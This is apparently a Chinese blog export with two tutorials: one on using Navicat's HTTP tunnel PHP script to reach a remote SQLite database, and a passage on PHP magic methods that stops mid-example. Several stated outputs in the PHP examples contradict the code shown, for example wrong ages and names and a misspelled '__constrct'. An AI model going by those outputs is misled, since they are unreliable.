  </entry>
  <entry>
    <title>Navicat使用HTTP通道远程连接SQLite</title>
    <url>/articles/Navicat%E4%BD%BF%E7%94%A8HTTP%E9%80%9A%E9%81%93%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5SQLite/</url>
    <content><![CDATA[<p>在线上环境的服务器，一般都是关闭了数据库外网访问的权限，这时候外网就不能直接连接数据库了，需要在服务器内才能操作数据库。但Navicat软件提供了HTTP通道代理连接数据库功能，只要服务器上有HTTP服务，并且端口开放了，就可以使用HTTP通道来连接数据库。</p>
<h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>数据库端口没开放外网访问的时候，Navicat在外网无法访问数据库。</p>
<p>服务器上运行着PHP，并且我们是可以访问到PHP的。</p>
<p>PHP可以连接SQLite数据库并执行SQL语句，因为它们都在内网和PHP支持SQLite。</p>
<p>虽然Navicat无法连接上SQLite，但是Navicat对数据库所有的查询可以让PHP代为查询，然后把结果返回给Navicat。</p>
<p>所以把一个php脚本放到服务器上，就可以让Navicat间接连接数据库，对数据库进行操作了。</p>
<h3 id="上传PHP脚本"><a href="#上传PHP脚本" class="headerlink" title="上传PHP脚本"></a>上传PHP脚本</h3><p>Navicat软件自带三个php代理脚本，它在Navicat安装目录下，分别是：<code>ntunnel_sqlite.php</code> <code>ntunnel_pgsql</code>.<code>php ntunnel_sqlite.php</code> <a href="#附件">点击获取</a></p>
<p>这里主要讲SQLite，所以用到的是<code>ntunnel_sqlite.php</code>脚本，其他数据库基本同理。</p>
<p>将<code>ntunnel_sqlite.php</code>上传到服务器(远程服务器必须支持php环境)，并测试能否通过浏览器访问到</p>
<p><img src="/articles/Navicat使用HTTP通道远程连接SQLite/2.png" alt></p>
<h3 id="Navicat连接设置"><a href="#Navicat连接设置" class="headerlink" title="Navicat连接设置"></a>Navicat连接设置</h3><p>在新建或者编辑连接的时候，选项卡里面都会有一个<code>HTTP</code>，切换到<code>HTTP</code>选项卡。</p>
<p>然后勾选<code>使用HTTP通道</code>，<code>通道网址</code>处输入<code>ntunnel_sqlite.php</code>的网址。</p>
<p>建议勾选上<code>用base64编码</code>传出查询，不然有可能出现<code>700 Invalid response: 500</code>错误。</p>
<p>这个错误主要出现在获取数据库列表和表结构的时候出现，服务器有使用防护软件，也有可能是它捣的鬼。</p>
<p><img src="/articles/Navicat使用HTTP通道远程连接SQLite/3.png" alt></p>
<p>然后在常规选项卡里，设置好<code>端口</code>、<code>用户名</code>、<code>密码</code>，主机输入<code>127.0.0.1</code>或者对应的内网IP。</p>
<p>简单来说就是服务器上项目配置里的数据库连接配置怎么设置的，这里就怎么设置，因为是用php来代替连接数据库</p>
<p><img src="/articles/Navicat使用HTTP通道远程连接SQLite/1.png" alt></p>
<h3 id="测试连接"><a href="#测试连接" class="headerlink" title="测试连接"></a>测试连接</h3><p>最后，测试下连接。如果有错误，先重启navicate，还不行的话再按照错误信息修改下对应的配置即可。</p>
<p><img src="/articles/Navicat使用HTTP通道远程连接SQLite/4.png" alt></p>
<h3 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h3><p>如果你不知道在哪找到通道脚本，关注下面微信号，回复 <code>navicat</code> 即可获取。</p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>PHP 中 16 个魔术方法详解</title>
    <url>/articles/PHP%20%E4%B8%AD%2016%20%E4%B8%AA%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>PHP中把以两个下划线__开头的方法称为魔术方法，这些方法在PHP中充当了举足轻重的作用。 魔术方法包括：</p>
<p><code>__construct()</code>: 类的构造函数</p>
<p><code>__destruct()</code>: 类的析构函数</p>
<p><code>__call()</code>: 在对象中调用一个不可访问方法时调用</p>
<p><code>__callStatic()</code>: 用静态方式中调用一个不可访问方法时调用</p>
<p><code>__get()</code>: 获得一个类的成员变量时调用</p>
<p><code>__set()</code>: 设置一个类的成员变量时调用</p>
<p><code>__isset()</code>: 当对不可访问属性调用isset()或empty()时调用</p>
<p><code>__unset()</code>: 当对不可访问属性调用unset()时被调用。</p>
<p><code>__sleep()</code>: 执行serialize()时，先会调用这个函数</p>
<p><code>__wakeup()</code>: 执行unserialize()时，先会调用这个函数</p>
<p><code>__toString()</code>: 类被当成字符串时的回应方法</p>
<p><code>__invoke()</code>: 调用函数的方式调用一个对象时的回应方法</p>
<p><code>__set_state()</code>: 调用var_export()导出类时，此静态方法会被调用。</p>
<p><code>__clone()</code>: 当对象复制完成时调用</p>
<p><code>__autoload()</code>: 尝试加载未定义的类</p>
<p><code>__debugInfo()</code>: 打印所需调试信息范例</p>
<p>下面让我们以实例的形式向大家讲解下这几个魔术方法时如何使用的。</p>
<h4 id="construct"><a href="#construct" class="headerlink" title="__construct"></a>__construct</h4><p>php中构造方法是对象创建完成后第一个被对象自动调用的方法。在每个类中都有一个构造方法，如果没有显示地声明它，那么类中都会默认存在一个没有参数且内容为空的构造方法。</p>
<p>作用:</p>
<p>通常构造方法被用来执行一些有用的初始化任务，如对成员属性在创建对象时赋予初始值。</p>
<p>声明格式:</p>
<blockquote>
<p>function __constrct([参数列表]){    方法体 //通常用来对成员属性进行初始化赋值}</p>
</blockquote>
<p>注意的事项:</p>
<ul>
<li><p>在同一个类中只能声明一个构造方法，原因是，PHP不支持构造函数重载。</p>
</li>
<li><p>构造方法名称是以两个下画线开始的__construct()</p>
</li>
</ul>
<p>下面是它的例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $sex;</span><br><span class="line">    <span class="comment">/*** 显示声明一个构造方法且带参数  ***/</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">""</span>, $sex = <span class="string">"男"</span>, $age = <span class="number">22</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex = $sex;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*** say 方法   ***/</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"我叫："</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">"，性别："</span> . <span class="keyword">$this</span>-&gt;sex . <span class="string">"，年龄："</span> . <span class="keyword">$this</span>-&gt;age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建对象 $Person1 且不带任参数</span></span><br><span class="line">$Person1 = <span class="keyword">new</span> Person();</span><br><span class="line"><span class="keyword">echo</span> $Person1-&gt;say(); <span class="comment">//输出:我叫：，性别：男，年龄：27</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建对象$Person2且带参数“小明”</span></span><br><span class="line">$Person2 = <span class="keyword">new</span> Person(<span class="string">"小明"</span>);</span><br><span class="line"><span class="keyword">echo</span> $Person2-&gt;say(); <span class="comment">//输出：我叫：张三，性别：男，年龄：27</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建对象$Person3且带三个参数</span></span><br><span class="line">$Person3 = <span class="keyword">new</span> Person(<span class="string">"李四"</span>,<span class="string">"男"</span>,<span class="number">25</span>);</span><br><span class="line"><span class="keyword">echo</span> $Person3-&gt;say(); <span class="comment">//输出：我叫：李四，性别：男，年龄：25</span></span><br></pre></td></tr></table></figure>

<p>通过上面的讲解，现在我们已经知道了什么叫构造方法。那么与构造方法对应的就是析构方法。</p>
<h4 id="destruct"><a href="#destruct" class="headerlink" title="_destruct()"></a>_destruct()</h4><p>析构方法允许在销毁一个类之前执行的一些操作或完成一些功能，比如说关闭文件、释放结果集等。</p>
<p>析构方法是PHP5才引进的新内容。</p>
<p>析造方法的声明格式与构造方法 __construct() 比较类似，也是以两个下划线开始的方法 __destruct() ，这种析构方法名称也是固定的。</p>
<p>声明格式:</p>
<blockquote>
<p>function __destruct(){ //方法体}</p>
</blockquote>
<p>注意：析构函数不能带有任何参数。</p>
<p>作用:</p>
<p>一般来说，析构方法在PHP中并不是很常用，它属类中可选择的一部分，通常用来完成一些在对象销毁前的清理任务。</p>
<p>举例演示，如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $sex;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">""</span>, $sex = <span class="string">"男"</span>, $age = <span class="number">22</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex = $sex;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**     * say 说话方法     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"我叫："</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">"，性别："</span> . <span class="keyword">$this</span>-&gt;sex . <span class="string">"，年龄："</span> . <span class="keyword">$this</span>-&gt;age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**     * 声明一个析构方法     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"我觉得我还可以再抢救一下，我的名字叫"</span> . <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$Person = <span class="keyword">new</span> Person(<span class="string">"小明"</span>);</span><br><span class="line"><span class="keyword">unset</span>($Person); <span class="comment">//销毁上面创建的对象$Person</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">上面的程序运行时输出：</span><br><span class="line"></span><br><span class="line">我觉得我还可以再抢救一下，我的名字叫小明三</span><br></pre></td></tr></table></figure>

<h4 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h4><p>__call()在对象中调用一个不可访问方法时调用。 该方法有两个参数，第一个参数 $function_name 会自动接收不存在的方法名，第二个 $arguments 则以数组的方式接收不存在方法的多个参数。</p>
<p>格式：</p>
<blockquote>
<p>function __call(string $function_name, array $arguments){    // 方法体}</p>
</blockquote>
<p>作用：</p>
<p>为了避免当调用的方法不存在时产生错误，而意外的导致程序中止，可以使用 __call() 方法来避免。</p>
<p>该方法在调用的方法不存在时会自动调用，程序仍会继续执行下去。</p>
<p>请参考如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">say</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hello, world!&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**     * 声明此方法用来处理调用对象中不存在的方法     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($funName, $arguments)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"你所调用的函数："</span> . $funName . <span class="string">"(参数："</span>; <span class="comment">// 输出调用不存在的方法名</span></span><br><span class="line">        print_r($arguments); <span class="comment">// 输出调用不存在的方法时的参数列表</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">")不存在！&lt;br&gt;\n"</span>; <span class="comment">// 结束换行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$Person = <span class="keyword">new</span> Person();</span><br><span class="line">$Person-&gt;run(<span class="string">"teacher"</span>); <span class="comment">// 调用对象中不存在的方法，则自动调用了对象中的__call()方法</span></span><br><span class="line">$Person-&gt;eat(<span class="string">"小明"</span>, <span class="string">"苹果"</span>);</span><br><span class="line">$Person-&gt;say();</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"></span><br><span class="line">你所调用的函数：run(参数：<span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; teacher ) )不存在！</span><br><span class="line">你所调用的函数：eat(参数：<span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; 小明 [<span class="number">1</span>] =&gt; 苹果 ) )不存在！</span><br><span class="line">Hello, world!</span><br></pre></td></tr></table></figure>

<h4 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic()"></a>__callStatic()</h4><p>__callStatic()，用静态方式中调用一个不可访问方法时调用，此方法与上面所说的 __call() 功能除了 __callStatic() 是未静态方法准备的之外，其它都是一样的。</p>
<p>请看下面代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">say</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hello, world!&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**     * 声明此方法用来处理调用对象中不存在的方法     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span><span class="params">($funName, $arguments)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"你所调用的静态方法："</span> . $funName . <span class="string">"(参数："</span>; <span class="comment">// 输出调用不存在的方法名</span></span><br><span class="line">        print_r($arguments); <span class="comment">// 输出调用不存在的方法时的参数列表</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">")不存在！&lt;br&gt;\n"</span>; <span class="comment">// 结束换行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$Person = <span class="keyword">new</span> Person();</span><br><span class="line">$Person::run(<span class="string">"teacher"</span>); <span class="comment">// 调用对象中不存在的方法，则自动调用了对象中的__call()方法</span></span><br><span class="line">$Person::eat(<span class="string">"小明"</span>, <span class="string">"苹果"</span>);</span><br><span class="line">$Person-&gt;say();</span><br><span class="line"></span><br><span class="line">运行结果如下：</span><br><span class="line"></span><br><span class="line">你所调用的静态方法：run(参数：<span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; teacher ) )不存在！</span><br><span class="line">你所调用的静态方法：eat(参数：<span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; 小明 [<span class="number">1</span>] =&gt; 苹果 ) )不存在！</span><br><span class="line">Hello, world!</span><br></pre></td></tr></table></figure>

<h4 id="get"><a href="#get" class="headerlink" title="__get()"></a>__get()</h4><p>__get()，获得一个类的成员变量时调用。 在 php 面向对象编程中，类的成员属性被设定为 private 后，如果我们试图在外面调用它则会出现 <code>不能访问某个私有属性</code> 的错误。那么为了解决这个问题，我们可以使用魔术方法 __get()。</p>
<p>魔术方法__get()的作用</p>
<p>在程序运行过程中，通过它可以在对象的外部获取私有成员属性的值。</p>
<p>我们通过下面的 __get() 的实例来更进一步的连接它吧：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $name;</span><br><span class="line">    <span class="keyword">private</span> $age;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">""</span>, $age = <span class="number">1</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**     * 在类中添加__get()方法，在直接获取属性值时自动调用一次，以属性名作为参数传入并处理     * <span class="doctag">@param</span> $propertyName     *     * <span class="doctag">@return</span> int     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($propertyName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($propertyName == <span class="string">"age"</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;age &gt; <span class="number">30</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;age - <span class="number">10</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;$propertyName;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;$propertyName;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$Person = <span class="keyword">new</span> Person(<span class="string">"小明"</span>, <span class="number">60</span>); <span class="comment">// 通过Person类实例化的对象，并通过构造方法为属性赋初值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"姓名："</span> . $Person-&gt;name . <span class="string">"&lt;br&gt;"</span>;   <span class="comment">// 直接访问私有属性name，自动调用了__get()方法可以间接获取</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"年龄："</span> . $Person-&gt;age . <span class="string">"&lt;br&gt;"</span>;    <span class="comment">// 自动调用了__get()方法，根据对象本身的情况会返回不同的值</span></span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"></span><br><span class="line">姓名：小明年龄：<span class="number">50</span>六、 __set()，设置一个类的成员变量时调用</span><br></pre></td></tr></table></figure>

<h4 id="set"><a href="#set" class="headerlink" title="__set()"></a>__set()</h4><p>__set( $property, $value )` 方法用来设置私有属性， 给一个未定义的属性赋值时，此方法会被触发，传递的参数是被设置的属性名和值。</p>
<p>请看下面的演示代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $name;</span><br><span class="line">    <span class="keyword">private</span> $age;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">""</span>, $age = <span class="number">25</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**     * 声明魔术方法需要两个参数，真接为私有属性赋值时自动调用，并可以屏蔽一些非法赋值     * <span class="doctag">@param</span> $property     * <span class="doctag">@param</span> $value     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($property, $value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($property == <span class="string">"age"</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($value &gt; <span class="number">150</span> || $value &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$property = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**     * 在类中声明说话的方法，将所有的私有属性说出     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"我叫"</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">"，今年"</span> . <span class="keyword">$this</span>-&gt;age . <span class="string">"岁了"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$Person = <span class="keyword">new</span> Person(<span class="string">"小明"</span>, <span class="number">25</span>); <span class="comment">//注意，初始值将被下面所改变</span></span><br><span class="line"><span class="comment">//自动调用了__set()函数，将属性名name传给第一个参数，将属性值”李四”传给第二个参数</span></span><br><span class="line">$Person-&gt;name = <span class="string">"小红"</span>;     <span class="comment">//赋值成功。如果没有__set()，则出错。</span></span><br><span class="line"><span class="comment">//自动调用了__set()函数，将属性名age传给第一个参数，将属性值26传给第二个参数$Person-&gt;age = 16; // 赋值成功</span></span><br><span class="line">$Person-&gt;age = <span class="number">160</span>; <span class="comment">//160是一个非法值，赋值失效</span></span><br><span class="line">$Person-&gt;say();  <span class="comment">// 输出：我叫小红，今年16岁了</span></span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"></span><br><span class="line">我叫小红，今年<span class="number">16</span>岁了</span><br></pre></td></tr></table></figure>

<h4 id="isset"><a href="#isset" class="headerlink" title="__isset()"></a>__isset()</h4><p>__isset()，当对不可访问属性调用isset()或empty()时调用。在看这个方法之前我们看一下isset()函数的应用，isset()是测定变量是否设定用的函数，传入一个变量作为参数，如果传入的变量存在则传回true，否则传回false。</p>
<p>那么如果在一个对象外面使用isset()这个函数去测定对象里面的成员是否被设定可不可以用它呢？</p>
<p>分两种情况：</p>
<ul>
<li><p>如果对象里面成员是公有的，我们就可以使用这个函数来测定成员属性</p>
</li>
<li><p>如果是私有的成员属性，这个函数就不起作用了，原因就是因为私有的被封装了，在外部不可见。</p>
</li>
</ul>
<p>那么我们就不可以在对象的外部使用isset()函数来测定私有成员属性是否被设定了呢？ 当然是可以的，但不是一成不变。你只要在类里面加上一个<strong>isset()方法就可以了，当在类外部使用isset()函数来测定对象里面的私有成员是否被设定时，就会自动调用类里面的</strong>isset()方法了帮我们完成这样的操作。</p>
<blockquote>
<p><strong>isset()的作用：当对不可访问属性调用 isset() 或 empty() 时，</strong>isset() 会被调用。</p>
</blockquote>
<p>请看下面代码演示：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sex;</span><br><span class="line">    <span class="keyword">private</span> $name;</span><br><span class="line">    <span class="keyword">private</span> $age;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">""</span>, $age = <span class="number">25</span>, $sex = <span class="string">'男'</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex = $sex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**     * <span class="doctag">@param</span> $content     *     * <span class="doctag">@return</span> bool     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span><span class="params">($content)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"当在类外部使用isset()函数测定私有成员&#123;$content&#125;时，自动调用&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;$content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$person = <span class="keyword">new</span> Person(<span class="string">"小明"</span>, <span class="number">25</span>); <span class="comment">// 初始赋值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">isset</span>($person-&gt;sex),<span class="string">"&lt;br&gt;"</span>; <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">isset</span>($person-&gt;name),<span class="string">"&lt;br&gt;"</span>;<span class="comment">// 当在类外部使用isset()函数测定私有成员name时，自动调用</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">isset</span>($person-&gt;age),<span class="string">"&lt;br&gt;"</span>; <span class="comment">// 当在类外部使用isset()函数测定私有成员age时，自动调用</span></span><br></pre></td></tr></table></figure>

<h4 id="unset"><a href="#unset" class="headerlink" title="__unset()"></a>__unset()</h4><p>看这个方法之前呢，我们也先来看一下 unset() 函数，unset()这个函数的作用是删除指定的变量且传回true，参数为要删除的变量。</p>
<p>那么如果在一个对象外部去删除对象内部的成员属性用unset()函数可以吗？</p>
<p>这里自然也是分两种情况：</p>
<ul>
<li><p>如果一个对象里面的成员属性是公有的，就可以使用这个函数在对象外面删除对象的公有属性。</p>
</li>
<li><p>如果对象的成员属性是私有的，这个函数就没有权限去删除。</p>
</li>
</ul>
<p>虽然有以上两种情况，但我想说的是同样如果你在一个对象里面加上<strong>unset()这个方法，就可以在对象的外部去删除对象的私有成员属性了。在对象里面加上了</strong>unset()这个方法之后，在对象外部使用“unset()”函数删除对象内部的私有成员属性时，对象会自动调用__unset()函数来帮我们删除对象内部的私有成员属性。</p>
<p>请看如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sex;</span><br><span class="line">    <span class="keyword">private</span> $name;</span><br><span class="line">    <span class="keyword">private</span> $age;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">""</span>, $age = <span class="number">25</span>, $sex = <span class="string">'男'</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex = $sex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**     * <span class="doctag">@param</span> $content     *     * <span class="doctag">@return</span> bool     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span><span class="params">($content)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"当在类外部使用unset()函数来删除私有成员时自动调用的&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;$content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$person = <span class="keyword">new</span> Person(<span class="string">"小明"</span>, <span class="number">25</span>); <span class="comment">// 初始赋值</span></span><br><span class="line"><span class="keyword">unset</span>($person-&gt;sex);<span class="comment">// 成功删除</span></span><br><span class="line"><span class="keyword">unset</span>($person-&gt;name);<span class="comment">// 当在类外部使用unset()函数来删除私有成员时自动调用的&lt;br&gt;</span></span><br><span class="line"><span class="keyword">unset</span>($person-&gt;age);<span class="comment">// 当在类外部使用unset()函数来删除私有成员时自动调用的&lt;br&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h4><blockquote>
<p>执行serialize()时，先会调用这个函数. serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，则该方法会优先被调用，然后才执行序列化操作。</p>
</blockquote>
<p>此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。</p>
<p>如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。</p>
<p>注意：</p>
<ul>
<li>__sleep() 不能返回父类的私有成员的名字。这样做会产生一个 E_NOTICE 级别的错误。可以用 Serializable 接口来替代。</li>
</ul>
<p>作用：</p>
<ul>
<li>__sleep() 方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。</li>
</ul>
<p>具体请参考如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sex;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">""</span>, $age = <span class="number">25</span>, $sex = <span class="string">'男'</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex = $sex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**     * <span class="doctag">@return</span> array     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"当在类外部使用serialize()时会调用这里的__sleep()方法&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = base64_encode(<span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'name'</span>,</span><br><span class="line">            <span class="string">'age'</span></span><br><span class="line">        ); <span class="comment">// 这里必须返回一个数值，里边的元素表示返回的属性名称    </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$person = <span class="keyword">new</span> Person(<span class="string">'小明'</span>); <span class="comment">// 